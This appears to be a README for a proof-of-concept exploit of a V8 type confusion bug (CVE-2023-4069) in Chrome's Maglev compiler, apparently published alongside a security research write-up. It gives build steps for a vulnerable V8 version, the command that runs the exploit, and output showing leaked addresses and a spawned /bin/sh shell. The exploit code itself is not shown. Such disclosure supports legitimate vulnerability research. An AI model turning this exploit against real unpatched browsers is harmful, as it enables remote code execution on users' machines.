## V8 type confusion CVE-2023-4069

The analysis of this bug can be found [here]( https://github.blog/2023-10-17-getting-rce-in-chrome-with-incomplete-object-initialization-in-the-maglev-compiler). 

The exploit here is tested on `v8` version 11.5.150.16, which is the version shipped with Chrome 115.0.5790.98/99, the one before the bug was fixed, on Ubuntu 22.04. I have not tested it on Chrome itself.

To test, check out `v8` at version 11.5.150.16 and compile with the default settings using `tools/dev/gm.py x64.release`. Then open the file `poc.js` with `d8` with the `maglev` flag (Chrome would have enabled this flag already):

```
./d8 --maglev poc.js
```

On Ubuntu 22.04, it should call `execve("/bin/sh")` to spawn a new process:

```
./d8 --maglev exploit.js
oobDblAddr: 421e9
oobDblArr new length: 256
oobDblAddr2: 42251
oobObjAddr: 42299
func Addr: 19bf6d
code Addr: 19eb79
maglev Addr: e000d900 55d6
$ 
```

Shell code and some addresses may need changing on other platforms.


